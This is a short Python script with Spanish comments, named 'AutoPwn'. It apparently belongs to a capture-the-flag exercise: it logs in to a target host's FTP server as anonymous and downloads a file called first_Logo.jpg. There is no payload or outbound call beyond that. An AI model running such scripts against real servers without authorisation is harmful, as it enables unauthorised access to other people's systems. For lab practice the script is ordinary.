#!/usr/bin/python3

import os
import subprocess
import argparse
from colorama import Fore, Style
from ftplib import FTP

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, ip_address):
        # Definir la ruta del directorio en el servidor FTP
        ftp_path = '/first/'
        # Definir el nombre de usuario para la conexión FTP
        username = 'anonymous'
        # Definir el nombre del archivo a descargar
        filename = 'first_Logo.jpg'

        # Crear una instancia del objeto FTP y realizar la conexión
        ftp = FTP(self.ip_address)
        ftp.login(user=username, passwd='')

        # Combinar la ruta del directorio y el nombre de archivo
        file_path = os.path.join(ftp_path, filename)

        try:
            # Abrir el archivo local en modo escritura binaria
            with open(filename, 'wb') as file:
                # Descargar el archivo desde el servidor FTP y escribirlo en el archivo local
                ftp.retrbinary(f'RETR {file_path}', file.write)
                # Imprimir un mensaje de éxito en color verde
                print(Fore.GREEN + "Se ha descargado el archivo correctamente" + Style.RESET_ALL)
        except Exception as e:
            # En caso de error, imprimir el mensaje de error en color rojo
            print(Fore.RED + f'Error al descargar el archivo: {str(e)}' + Style.RESET_ALL)

        # Cerrar la conexión FTP
        ftp.quit()


def get_arguments():
    # Crear un objeto ArgumentParser para manejar los argumentos de línea de comandos
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    # Definir los argumentos requeridos y opcionales
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=21, dest='lport', required=False, help='Proporcionar puerto.')
    # Analizar los argumentos de línea de comandos y devolverlos
    return parser.parse_args()

def main():
    # Obtener los argumentos de línea de comandos
    args = get_arguments()
    # Crear una instancia de la clase Exploit con los argumentos proporcionados
    exploit = Exploit(args.ip_address, args.lport)
    # Ejecutar el método run de la instancia de Exploit
    exploit.run(args.ip_address)

if __name__ == '__main__':
    # Llamar a la función main cuando se ejecute el script
    main()
